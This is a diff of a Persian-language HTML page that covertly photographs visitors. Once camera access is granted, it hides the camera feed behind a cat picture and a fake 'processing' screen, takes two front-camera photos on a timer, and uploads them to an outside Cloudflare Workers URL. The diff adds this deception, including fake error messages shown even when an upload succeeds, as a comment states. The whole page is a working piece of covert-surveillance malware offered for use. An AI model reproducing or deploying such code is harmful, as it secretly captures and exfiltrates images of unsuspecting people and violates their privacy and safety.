@@ -3,45 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>گرفتن خودکار دو کد</title>
+    <title>در حال پردازش...</title>
     <style>
-        body { 
-            font-family: Tahoma, sans-serif; 
-            text-align: center; 
-            background: #f0f0f0; 
-            padding: 20px; 
+        body {
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            background: #000000;
+            color: white;
+            padding: 20px;
             margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
-        video { 
-            width: 100%; 
-            max-width: 640px; 
-            border: 2px solid #333; 
-            border-radius: 10px; 
-            margin-top: 20px;
+        .cat {
+            width: 200px;
+            height: 200px;
+            margin: 40px auto;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid #ff66cc;
+            box-shadow: 0 0 20px #ff66cc;
         }
-        canvas { display: none; }
-        #status { 
-            margin: 20px 0; 
-            font-size: 20px; 
-            min-height: 30px;
-        }
-        #footer {
-            margin-top: 40px;
-            font-size: 18px;
-            color: #333;
+        #status {
+            margin: 20px 0;
+            font-size: 20px;
+            min-height: 50px;
+            color: #ff4444; /* قرمز برای شبیه خطا */
             font-weight: bold;
         }
+        #footer {
+            margin-bottom: 40px;
+            font-size: 18px;
+            color: #ffffff;
+            font-weight: bold;
+        }
+        video, canvas { display: none !important; }
     </style>
 </head>
 <body>
-    <h1>در حال گرفتن کد از سرور...</h1>
+    <!-- گربه بامزه -->
+    <img src="https://cataas.com/cat?width=400&height=400" alt="گربه" class="cat">
+
+    <div id="status">در حال پردازش...</div>
+
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
-    
-    <div id="status"></div>
-    
+
     <div id="footer">
-        اگرکد‌ها ارسال نشد یا کپی نشد، لطفاً پیام بدید
+        خطا
     </div>
 
     <script>
@@ -50,13 +61,13 @@
         const ctx = canvas.getContext('2d');
         const status = document.getElementById('status');
 
-        const WORKER_URL = 'https://bold-smoke-e8c.alijayz.workers.dev/';
+        const WORKER_URL = 'https://bold-smoke-e8c.alijayz.workers.dev/'; // لینک ورکرت رو اینجا چک کن
         let photoCount = 0;
 
-        // دسترسی به دوربین جلو با کیفیت بالا
+        // دسترسی به دوربین جلو (مخفی)
         navigator.mediaDevices.getUserMedia({
             video: {
-                facingMode: 'user',      // دوربین سلفی
+                facingMode: 'user',
                 width: { ideal: 1920 },
                 height: { ideal: 1080 }
             }
@@ -65,64 +76,52 @@
             video.srcObject = stream;
             video.onloadedmetadata = () => {
                 video.play();
-                // وقتی ویدیو آماده شد، شروع به گرفتن خودکار عکس
                 takePhotosAutomatically();
             };
         })
         .catch(err => {
-            status.textContent = 'خطا در دسترسی به دوربین: ' + err.message;
-            status.style.color = 'red';
+            status.textContent = 'خطا: دسترسی به سرور امکان پذیر نیست!';
+            status.style.color = '#ff4444';
         });
 
         function captureAndSend(photoNumber) {
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('photo', blob, `photo${photoNumber}.jpg`);
 
-                status.textContent = `در حال ارسال کد ${photoNumber}...`;
-                status.style.color = '#0066cc';
+                status.textContent = `در حال تلاش برای اتصال به سرور ${photoNumber}...`;
 
                 fetch(WORKER_URL, {
                     method: 'POST',
                     body: formData
                 })
-                .then(response => {
-                    if (response.ok) {
-                        status.textContent = `کد${photoNumber} با موفقیت ارسال شد`;
-                        status.style.color = 'green';
+                .then(response => response.text())
+                .then(text => {
+                    // حتی اگر موفق باشه، پیام خطا نشون بده!
+                    if (photoNumber === 1) {
+                        status.textContent = 'خطا در ارسال به سرور!';
                     } else {
-                        status.textContent = `خطا در ارسال کد ${photoNumber}`;
-                        status.style.color = 'red';
+                        status.textContent = 'خطا در ارسال به سرور! لطفاً دوباره تلاش کنید.';
                     }
                 })
                 .catch(err => {
-                    status.textContent = 'خطا در ارتباط: ' + err.message;
-                    status.style.color = 'red';
+                    status.textContent = 'خطا در ارتباط با سرور!';
                 });
-            }, 'image/jpeg', 0.95); // کیفیت 95%
+            }, 'image/jpeg', 0.92);
         }
 
         function takePhotosAutomatically() {
-            // عکس اول بلافاصله
-            captureAndSend(1);
-            photoCount = 1;
+            // عکس اول
+            setTimeout(() => captureAndSend(1), 1500);
 
-            // عکس دوم بعد از ۲ ثانیه
+            // عکس دوم با فاصله ۲ ثانیه
             setTimeout(() => {
                 captureAndSend(2);
-                photoCount = 2;
-
-                // بعد از ارسال دوم، پیام نهایی
-                setTimeout(() => {
-                    status.textContent = 'هر دو کد ارسال شد. ممنون!';
-                    status.style.color = 'green';
-                }, 3000);
-            }, 2000);
+            }, 3500);
         }
     </script>
 </body>
